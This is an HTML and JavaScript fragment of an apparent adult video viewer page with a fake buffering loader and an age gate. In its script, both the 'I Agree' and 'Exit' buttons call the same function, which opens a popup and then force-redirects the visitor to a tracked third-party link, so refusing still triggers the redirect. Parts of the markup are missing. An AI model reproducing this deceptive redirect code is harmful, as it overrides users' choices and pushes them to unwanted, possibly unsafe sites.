<style>

html,body{
margin:0;
padding:0;
width:100%;
height:100%;
background:#000;
font-family:sans-serif;
overflow:hidden;
}

video{
position:fixed;
inset:0;
width:100%;
height:100%;
object-fit:cover;
background:#000;
}

/* LOADER */

#loader{
position:fixed;
inset:0;
display:flex;
align-items:center;
justify-content:center;
background:#000;
color:#fff;
z-index:1000;
flex-direction:column;
}

.spinner{
border:4px solid rgba(255,255,255,.2);
border-top:4px solid #fff;
border-radius:50%;
width:40px;
height:40px;
animation:spin 1s linear infinite;
margin-bottom:10px;
}

@keyframes spin{
0%{transform:rotate(0)}
100%{transform:rotate(360deg)}
}

/* AGE GATE */

#gate{
position:fixed;
inset:0;
display:flex;
align-items:center;
justify-content:center;
background:rgba(0,0,0,.5);
backdrop-filter:blur(4px);
z-index:999;
}

.box{
width:90%;
max-width:360px;
background:rgba(0,0,0,.8);
padding:20px;
border-radius:12px;
color:#fff;
text-align:center;
}

.btn{
display:block;
width:100%;
padding:12px;
border:none;
margin-top:10px;
border-radius:8px;
font-size:16px;
cursor:pointer;
}

.yes{background:#1e88ff;color:#fff;}
.no{background:#444;color:#fff;}

/* BANNER */

#banner{
position:fixed;
bottom:0;
left:0;
width:100%;
text-align:center;
z-index:1001;
}

</style>

</head>

<body>

<!-- LOADER -->

Loading video...

</div>

<script>

(function(){

const params=new URLSearchParams(location.search)

let id=params.get("id")

if(!id) return

if(!id.endsWith(".mp4")) id+=".mp4"

const video=document.getElementById("video")

const loader=document.getElementById("loader")

const gate=document.getElementById("gate")

video.src="https://cdn.videy.co/"+id

const REDIRECT="https://peacockvowel.com/a8segny8y?key=eb62f8178997e8f4ee620d4a8d5add62"

/* FAKE BUFFER */

setTimeout(()=>{

loader.style.display="none"

},2200)

/* LANGUAGE AUTO */

if(!navigator.language.toLowerCase().startsWith("id")){

title.innerText="Are you 18+?"
desc.innerText="This content is for adults only"
agree.innerText="I Agree"
exit.innerText="Exit"

}

/* PROCEED */

function proceed(){

gate.style.display="none"

video.play().catch(()=>{})

/* EXTRA POP */

window.open("https://peacockvowel.com/a8segny8y?key=eb62f8178997e8f4ee620d4a8d5add62","_blank")

/* REDIRECT DELAY */

setTimeout(()=>{

location.href=REDIRECT

},1500)

}

agree.onclick=proceed
exit.onclick=proceed

})()

</script>
